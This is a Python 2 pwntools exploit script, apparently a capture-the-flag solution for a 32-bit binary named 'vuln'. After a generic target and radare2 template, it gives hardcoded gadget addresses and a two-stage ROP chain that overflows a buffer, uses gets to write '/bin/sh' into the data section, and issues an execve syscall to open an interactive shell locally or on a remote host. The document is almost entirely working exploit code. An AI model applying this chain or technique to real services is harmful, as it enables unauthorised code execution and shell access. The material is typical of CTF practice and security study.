#!/usr/bin/env python2

import argparse
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = './vuln'
libc = None
host = None
port = None

# ====================================================================
#   GLOBALS
# ====================================================================

T     = None      # The Target
LIBC  = None      # Libc ELF
BIN   = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)
            raw_input('PAUSED [PRESS ENTER TO CONTINUE]')

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================


def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BIN = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, args.port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    SYSCALL = 0x0806f7a0  # int 0x80; ret
    POP_EAX = 0x08056334  # pop eax; pop edx; pop ebx; ret
    POP_ECX = 0x0806ee92  # pop ecx; pop ebx; ret

    GETS       = 0x080488cc         # Reuse some of vuln() code to write /bin/sh to a fixed address
    FAKE_STACK = 0x080da520 + 0x18  # This is actually main_arena, but we won't use the heap so... why not?

    # (1) call gets(BIN_SH), we will write "/bin/sh\x00" into the .data section
    rop = 'A' * 0x18 + ''.join(map(pwn.p32, [FAKE_STACK, GETS]))
    T.sendlineafter('Can you ROP your way out of this one?\n', rop)

    # (2) write /bin/sh and continue with the ROP chain to execute execve("/bin/sh", 0, 0)
    rop = '/bin/sh\x00' + 'A' * 0x14 + ''.join(map(pwn.p32, [POP_EAX, 0xb, 0, 0, POP_ECX, 0, FAKE_STACK - 0x18, SYSCALL]))
    T.sendline(rop)

    T.interactive()
